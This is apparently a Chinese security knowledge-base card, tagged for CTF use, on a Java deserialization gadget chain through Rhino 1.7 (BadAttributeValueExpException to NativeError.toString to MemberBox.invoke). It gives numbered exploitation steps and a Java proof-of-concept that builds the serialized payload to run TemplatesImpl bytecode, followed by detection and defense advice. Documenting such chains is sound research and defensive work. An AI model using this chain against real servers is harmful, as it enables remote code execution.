---
id: web-java-deser-rhino1-nativeerror-tostring-memberbox-invoke
title: Rhino1 反序列化链：BAVE→NativeError.toString→ScriptableObject.getProperty→NativeJavaMethod.call→NativeJavaObject.unwrap→MemberBox.invoke 任意方法
type: scenario
domain: web
path: web/java/deserialization
technique: rhino1-nativeerror-tostring-memberbox-invoke
tags:
- java
- deserialization
- gadget
- rhino
- tostring
- method-invoke
- templatesimpl
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T16:59:56+08:00'
  notes: 已对照原文13668及45张图核对：NativeError.toString→getString→getProperty→IdScriptableObject.get→getImpl→GetterSlot→NativeJavaMethod.call→NativeJavaObject.unwrap→MemberBox.invoke(method.invoke) 链路与图01-09一致；BAVE readObject触发toString依赖旧JDK已在正文标注；PoC未本机执行
url: /docs/web/java/deserialization/web-java-deser-rhino1-nativeerror-tostring-memberbox-invoke/
draft: false
kb_aliases:
- Rhino1 链
- NativeError toString 链
- NativeJavaMethod call 链
- NativeJavaObject unwrap
- MemberBox invoke
- rhino 1.7 gadget
- BadAttributeValueExpException Rhino
---

## 一句话结论

classpath 存在 Rhino 1.7 时，可用 `BadAttributeValueExpException(val=NativeError)` 触发 `NativeError.toString()`，沿 `ScriptableObject.getProperty → getImpl → GetterSlot.getter` 取到 `NativeJavaMethod`，其 `call()` 通过 `NativeJavaObject.unwrap()` 得到被包装的 `javaObject` 并最终走到 `MemberBox.invoke() → Method.invoke()`；把 `javaObject` 设为 `TemplatesImpl`、方法设为 `newTransformer` 即执行字节码，在 Runtime/ProcessBuilder 被黑名单禁用时也可把方法设为 `RMIConnector.connect` 走二次反序列化。

## 原理

- **入口**：`BadAttributeValueExpException.readObject()` 会调用 `val.toString()`（旧 JDK），把 `val` 设为 `NativeError` 即可进入 Rhino 的 `toString`；`NativeError.toString()` 内部调用 `js_toString()` → `ScriptableObject.getString(obj, "name")` → `ScriptableObject.getProperty(obj, "name")`。
- **属性查找**：`getProperty` 以 `start=NativeError` 循环调用 `obj.get(name, start)`；`NativeError` 未重写 `get`，继承 `IdScriptableObject.get`，后者再调用父类 `ScriptableObject.get`，最终进入 `getImpl`。
- **GetterSlot 与 NativeJavaMethod**：`getImpl` 用 `getSlot(name, index, SLOT_QUERY)` 取 `Slot`；若为 `GetterSlot`，取 `slot.getter`。当 getter 是 `MemberBox` 时按 `delegateTo` 决定反射对象；否则把 getter 当作 `Function` 并调用 `f.call(cx, scope, start, args)`。把 `GetterSlot.getter` 设为 `NativeJavaMethod`（继承 `BaseFunction`/`Function`），即进入其 `call()`。
- **NativeJavaMethod.call**：`findFunction()` 在 `methods`（`MemberBox[]`）中按参数类型选中一个 `MemberBox`，随后执行 `MemberBox.invoke(thisObj, args)`。`MemberBox.invoke` 直接 `method.invoke(target, args)`，即任意方法调用点。
- **javaObject 可控**：`MemberBox.invoke` 在非静态方法上需要目标对象；它先看 `thisObj` 是否 `Wrapper`，若是则 `javaObject = ((Wrapper)o).unwrap()`。`NativeJavaObject` 实现 `Wrapper` 且 `unwrap()` 直接返回 `javaObject`，其 `readObject/writeObject` 虽然字段是 transient 也会保存/恢复 `javaObject`——把 `javaObject` 设为 `TemplatesImpl` 即可。为了让 `getPrototype()` 返回这个 `NativeJavaObject`，需反射设置 `ScriptableObject.prototypeObject`。
- **方法选择**：`NativeJavaMethod` 的 `methods` 数组可用反射构造（如 `new NativeJavaMethod(Method, name)` 或直接填 `MemberBox`），把方法设为 `TemplatesImpl.newTransformer()` 时路径为 `MemberBox.invoke → newTransformer → 加载 _bytecodes`；设为 `RMIConnector.connect()` 时转入二次反序列化。
- **为什么成立**：Rhino 把 JS 属性读取实现为 Java 反射调用，`GetterSlot.getter`/`MemberBox` 又是可序列化且可在反序列化后被反射改写的对象；整条链不依赖被过滤的 `Runtime/ProcessBuilder`，只依赖 Rhino 自身与 JDK 的 `BadAttributeValueExpException`。

## 触发条件

- 目标反序列化入口可控，且 `BadAttributeValueExpException` 或其 `toString` 触发路径未被 JEP290/黑名单拦截（JDK17 的 BAVE 仅接受 String，需换 XString 等触发）。
- classpath 存在 Rhino 1.7（`org.mozilla.javascript`），且 `NativeError`、`NativeJavaMethod`、`NativeJavaObject`、`ScriptableObject` 未被过滤。
- 可用 `TemplatesImpl`（且 JDK 未强封装 Xalan 内部类）或 `javax.management.remote.rmi.RMIConnector`（用于二次反序列化）。
- 攻击者能构造并提交序列化数据。

## 利用步骤

1. 确认 Rhino 版本与可用类；准备 `TemplatesImpl`（`_bytecodes` 为 AbstractTranslet 子类字节码、`_name`、`_tfactory=null`）或待调用的 `RMIConnector`。
2. 反射创建 `NativeError` 实例；用 `Context.initStandardObjects()` 建一个 `NativeObject` 作用域。
3. 创建 `NativeJavaObject(scope, templatesImpl/rmiConnector, 目标类)`，并反射把 `ScriptableObject.prototypeObject` 设为该对象，使 `getPrototype()` 返回它。
4. 用 `ScriptableObject.getSlot("name", 0, 4)` 取 `GetterSlot`，反射把其 `getter` 设为 `NativeJavaMethod`（method 为 `TemplatesImpl.newTransformer` 或 `RMIConnector.connect`，name 任意）。
5. 构造 `BadAttributeValueExpException("test")`，反射把 `val` 设为 `NativeError`；序列化并提交。
6. 反序列化触发 `toString → getProperty → getImpl → NativeJavaMethod.call → MemberBox.invoke`，执行字节码或进入 RMIConnector 二次反序列化。
7. 若目标 JDK17 的 BAVE 不接受非 String，改用 XString/Hashtable 等 toString 触发入口（见关联卡）。

## PoC

```java
// 关键构造（完整 exp 需按目标类名/版本调整）
Context context = Context.enter();
NativeObject scope = (NativeObject) context.initStandardObjects();
NativeJavaObject wrapped = new NativeJavaObject(scope, templatesImpl, TemplatesImpl.class);

NativeError nativeError = new NativeError(); // 反射 new
Field prototypeObject = ScriptableObject.class.getDeclaredField("prototypeObject");
prototypeObject.setAccessible(true);
prototypeObject.set(nativeError, wrapped);

Method m = TemplatesImpl.class.getDeclaredMethod("newTransformer");
m.setAccessible(true);
NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(m, "test");

Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
getSlot.setAccessible(true);
Object slot = getSlot.invoke(nativeError, "name", 0, 4); // SLOT_QUERY=4
Field getter = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot")
        .getDeclaredField("getter");
getter.setAccessible(true);
getter.set(slot, nativeJavaMethod);

BadAttributeValueExpException bave = new BadAttributeValueExpException("test");
Field val = BadAttributeValueExpException.class.getDeclaredField("val");
val.setAccessible(true);
val.set(bave, nativeError);
// serialize(bave) -> readObject -> NativeError.toString -> ... -> MemberBox.invoke -> newTransformer
```

原文在目标环境成功执行命令；本卡未在本机复跑。

## 变体与关联

- 变体：`MemberBox.invoke` 的目标换成 `RMIConnector.connect()`，接 `/stub/` 二次反序列化，见 [[web-java-deser-readobject-reflection-rmiconnector-secondary]] 与 [[web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary]]。
- 变体：`GetterSlot.getter` 也可设为 `MemberBox`（`delegateTo` 可控时），但 `delegateTo` 为 transient 默认空，通常走 `Function.call` 分支。
- 变体：触发入口从 BAVE 换成 `XString.equals`、`HotSwappableTargetSource` 等，见 [[web-java-deserialization-jdk-xstring-equals-tostring]]。
- 关联：[[web-java-deser-jndi-ldapattribute-getattributedefinition-sink]]（Rhino 链可调用的另一个 JNDI sink）、[[web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect]]（TemplatesImpl 字节码侧效应）。
- 边界：Rhino 版本差异会改变 `getSlot/getImpl` 内部细节；JDK 模块封装可能阻止反射写 `prototypeObject`/私有字段；JEP290 与类名黑名单（含 `org.mozilla.javascript`）会使链失效。

## 检测与防御

- 检测：反序列化流中出现 `org.mozilla.javascript.NativeError`、`NativeJavaMethod`、`NativeJavaObject`、`ScriptableObject$GetterSlot` 等类；`BadAttributeValueExpException` 的 `val` 非 String；异常栈出现 `MemberBox.invoke`。
- 防御：JEP290 全局过滤器/`ObjectInputFilter` 按类白名单限制；把 Rhino 相关类加入黑名单；升级 JDK 使 BAVE 只接受 String；禁用不必要的脚本引擎依赖。
- 边界：业务若合法使用 Rhino 脚本，需评估白名单策略；不能仅凭 Rhino 类存在判定攻击。
